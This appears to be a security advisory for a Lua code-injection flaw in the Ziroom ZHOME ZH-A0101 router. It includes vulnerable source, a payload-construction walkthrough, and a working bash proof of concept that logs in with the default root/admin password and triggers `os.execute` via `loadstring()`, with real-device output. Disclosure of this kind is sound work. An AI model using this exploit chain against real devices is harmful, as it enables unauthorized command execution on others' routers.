# Lua Code Injection Vulnerability in ZHOME ZH-A0101 ZRUsb via `loadstring()`

## Overview

- **Vendor:** Ziroom
- **Product:** ZHOME-A0101
- **Firmware Version:** 1.0.1.0, Build 202004151405
- **Platform:** OpenWrt / MediaTek MT7621, MIPS32
- **Vulnerability Type:** Arbitrary Lua Code Execution
- **CWE:** CWE-94, Code Injection
- **Affected Endpoint:** `GET /api/ZRUsb/get_usb_result`
- **Affected File:** `usr/lib/lua/luci/controller/api/zrUsb.lua`
- **Authentication Requirement:** HTTP Basic Auth as `root`
- **Severity:** High
- **Precondition:** Attacker must control `/tmp/run/usb_list_result` or `/tmp/run/old_usb_list_result`.

## Vulnerability Information

| Item                        | Detail             |
| --------------------------- | ------------------ |
| Affected Function           | `StrToTable()`     |
| Affected Function Location  | line 34-40         |
| Trigger Function 1          | `get_usb_result()` |
| Trigger Function 1 Location | line 156-176       |
| Trigger Function 2          | `get_usb_info()`   |
| Trigger Function 2 Location | line 85-154        |
| Sink                        | `loadstring()`     |
| Sink Location               | line 39            |

## Vulnerable Code

<img width="812" height="225" alt="image" src="https://github.com/user-attachments/assets/bc911e1a-b297-4706-b773-49ca987df6d8" />


```lua
function StrToTable(str)
    if str == nil or type(str) ~= "string" then
        return
    end

    return loadstring("return " .. str)()
end
```

Trigger path in `get_usb_result()`:

<img width="1101" height="683" alt="image" src="https://github.com/user-attachments/assets/d2d6be33-f8f0-40ae-a9d7-7b3230f1c035" />


```lua
function get_usb_result()
    LuciHttp.prepare_content("application/json")

    ZRQosFun.fork_exec('/usr/bin/list_usb.lua')

    if not ZRQosFun.file_exists("/tmp/run/usb_list_result") then
        local result = {code=1}
        LuciHttp.write_json(result)
        return
    end

    local file = io.open("/tmp/run/usb_list_result","r")
    local str = ""
    for line in file:lines() do
        if not ZRFun.isStrNil(line) then
            str = str..line
        end
    end
    file:close()

    os.execute("cp /tmp/run/usb_list_result /tmp/run/old_usb_list_result")
    os.execute("rm /tmp/run/usb_list_result /tmp/run/list_usb_lock")

    LuciHttp.write_json(StrToTable(str))
end
```

## Root Cause

`StrToTable()` parses a string by compiling and executing it as Lua source code:

```lua
loadstring("return " .. str)()
```

This is unsafe when the input string can be influenced by an attacker. The function expects a table-like string, but Lua table constructors can contain expressions with side effects.

## Source-to-Sink Chain

```text
Attacker-controlled file content
    |
    v
/tmp/run/usb_list_result or /tmp/run/old_usb_list_result
    |
    v
get_usb_result() / get_usb_info()
    |
    v
io.open(...):read file content
    |
    v
StrToTable(str)
    |
    v
loadstring("return " .. str)()
    |
    v
Lua VM executes expressions embedded in the table constructor
```

## Trigger Conditions

| Condition      | Description                                                  |
| -------------- | ------------------------------------------------------------ |
| Authentication | API requires authenticated root access                       |
| File control   | Attacker must control the result file content                |
| Timing         | `list_usb.lua` may overwrite `/tmp/run/usb_list_result`      |
| Trigger        | Call `get_usb_result()` or `get_usb_info()` after the file is prepared |

## Safe Demonstration Pattern

The supplied analysis demonstrates that a table string containing an immediately invoked function expression is evaluated by `loadstring()`. For reporting, the important point is not the exact command but the evaluation behavior:

```lua
{code=0, global_list={}, (function() os.execute([[<command>]]) end)()}
```

This is valid Lua syntax inside a table constructor and therefore runs during evaluation.

## Impact

If an attacker can write the USB result file, the endpoint can execute arbitrary Lua code. Since Lua code can call `os.execute()`, this becomes command execution in the web management context.

## Injection Principle

### How `loadstring` works

`loadstring("return " .. str)()` execution process:

1. Concatenation: `"return " .. str` generates a complete Lua source string
2. Compilation: `loadstring()` compiles the string into a Lua function
3. Execution: the trailing `()` calls the compiled function
4. Return: the function returns the evaluated result of the table constructor `{...}`

### Payload construction

Goal: embed executable code inside a table constructor.

Method: use an immediately invoked function expression (IIFE) as a table element.

```lua
{
    code = 0,                                          -- normal field
    global_list = {},                                  -- normal field
    (function() os.execute([[touch /tmp/test]]) end)() -- ★ function call, returns nil
}
```

Why it works:

- Lua table constructors allow arbitrary expressions as values
- `(function() ... end)() ` is a valid expression (IIFE)
- `os.execute()` inside the function body executes as a side-effect
- The function returns `nil`, which does not affect table construction

Why `[[...]]` strings:

- `[[...]]` is Lua's long string syntax — no escape character interpretation
- Avoids escaping issues with `\`, `"`, `'` and other characters
- Can contain arbitrary shell commands

### Full payload walkthrough

Input:

```text
str = '{code=0,global_list={},(function() os.execute([[touch /tmp/vuln38_rce]]) end)()}'
```

After `loadstring` concatenation:

```lua
return {code=0,global_list={},(function() os.execute([[touch /tmp/vuln38_rce]]) end)()}
```

Lua parsing:

```text
┌─ return
└─ Table constructor {
    ├─ code = 0
    ├─ global_list = {}
    └─ (function()                              -- anonymous function definition
          os.execute([[touch /tmp/vuln38_rce]]) -- shell command execution
       end)()                                   -- immediate invocation
  }
```

Execution order:

1. Table constructor begins
2. Evaluate `code = 0`
3. Evaluate `global_list = {}`
4. Evaluate `(function() ... end)()`
   → Call anonymous function
   → `os.execute("touch /tmp/vuln38_rce")`
   → Shell executes: `touch /tmp/vuln38_rce`
   → File created successfully
   → Function returns `nil`
5. Table construction complete: `{code=0, global_list={}}`
6. `loadstring` returns the table

## Exploit Chain

```text
Attacker
  │
  ├─ Step 1: Obtain root credentials (weak MD5 hash can be cracked instantly)
  │
  ├─ Step 2: Write malicious file via existing RCE vulnerability
  │           Method A: VULN-04 (zonename injection)
  │           Method B: VULN-32 (ping url injection)
  │           Method C: VULN-35 (firstLogin injection)
  │           Method D: SSH access
  │
  │           Write command:
  │           printf '%s' '{code=0,global_list={},(function() os.execute([[<CMD>]]) end)()}' \
  │             > /tmp/run/usb_list_result
  │
  ├─ Step 3: Call API to trigger StrToTable
  │           GET /cgi-bin/luci/;stok=<STOK>/api/ZRUsb/get_usb_result
  │
  ├─ Step 4: StrToTable → loadstring → os.execute → command execution
  │
  └─ Step 5: Verify execution result
```

### Prerequisites

| Condition           | Description                                     | How to satisfy                                            |
| ------------------- | ----------------------------------------------- | --------------------------------------------------------- |
| Root authentication | All API endpoints require root access           | Crack MD5 hash / default password                         |
| File write          | Must control `/tmp/run/usb_list_result` content | Via another RCE vulnerability                             |
| Endpoint call       | Must call `get_usb_result` or `get_usb_info`    | HTTP GET request                                          |
| Timing              | `list_usb.lua` may overwrite the file           | Rapid write + trigger, or when no USB device is connected |

## Proof of Concept

### Create file

```bash
#!/bin/bash
# VULN-38 PoC: Create file
DEVICE="192.168.18.1"

# Step 1: Login
curl -s --noproxy "*" -c cookies.txt -X POST \
  "http://${DEVICE}/cgi-bin/luci" \
  -d "username=root&password=admin" -L -D headers.txt

STOK=$(grep stok headers.txt | sed 's/.*stok=//;s/\r//;s/\/.*//')

# Step 2: Write payload (via SSH or another RCE vulnerability)
ssh -p 1022 root@${DEVICE} "mkdir -p /tmp/run"
ssh -p 1022 root@${DEVICE} \
  "printf '%s' '{code=0,global_list={},(function() os.execute([[touch /tmp/pwned]]) end)()}' \
   > /tmp/run/usb_list_result"

# Step 3: Trigger
curl -s --noproxy "*" --max-time 15 -b cookies.txt \
  "http://${DEVICE}/cgi-bin/luci/;stok=${STOK}/api/ZRUsb/get_usb_result"

# Step 4: Verify
ssh -p 1022 root@${DEVICE} "ls -la /tmp/pwned"
```

## Real Device Verification

### Step 1: Login and obtain STOK

```bash
curl -s --noproxy "*" -c cookies.txt -X POST \
  "http://192.168.18.1/cgi-bin/luci" \
  -d "username=root&password=admin" \
  -L -D headers.txt

STOK=$(grep stok headers.txt | sed 's/.*stok=//;s/\r//;s/\/.*//')
```

### Step 2: Write malicious Lua payload

Via SSH (or another RCE vulnerability):

```bash
ssh -p 1022 root@192.168.18.1 "mkdir -p /tmp/run"

ssh -p 1022 root@192.168.18.1 \
  "printf '%s' '{code=0,global_list={},(function() os.execute([[touch /tmp/vuln38_rce]]) end)()}' \
   > /tmp/run/usb_list_result"
```

Verify file content:

```bash
ssh -p 1022 root@192.168.18.1 "cat /tmp/run/usb_list_result"
```

Output:

```text
{code=0,global_list={},(function() os.execute([[touch /tmp/vuln38_rce]]) end)()}
```

### Step 3: Call API to trigger StrToTable

```bash
curl -s --noproxy "*" --max-time 15 -b cookies.txt \
  "http://192.168.18.1/cgi-bin/luci/;stok=${STOK}/api/ZRUsb/get_usb_result"
```

API response:

```json
{ "code": 1 }
```

Response code `1` is normal (USB device not present), but `loadstring` has already executed internally.

### Step 4: Verify file creation

```bash
ssh -p 1022 root@192.168.18.1 "ls -la /tmp/vuln38_rce"
```

SSH response:

```text
-rw-r--r--    1 root     root             0 Jul 28 17:02 /tmp/vuln38_rce
```

✅ File created successfully — arbitrary code execution verified.
<img width="1842" height="168" alt="3cdfb51ebc159686adf1d80711d14b4a" src="https://github.com/user-attachments/assets/c0464bf6-cd66-4781-8c10-03853c3eb25c" />


